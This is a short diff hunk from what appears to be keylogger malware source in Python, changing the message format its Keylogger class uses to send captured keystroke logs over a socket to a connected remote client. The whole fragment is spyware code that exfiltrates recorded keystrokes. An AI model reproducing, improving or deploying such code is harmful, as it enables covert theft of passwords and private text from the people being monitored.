@@ -261,7 +261,7 @@ class Keylogger:
                     log_data = "\n".join(self.log)
                     client.socket.sendall("L".encode("utf-8"))
                     client.socket.sendall(
-                        f"{len(log_data)} [LOG]{log_data}".encode("utf-8")
+                        f"Logg{len(log_data)}|{log_data}".encode("utf-8")
                     )
                     self.log = []
 
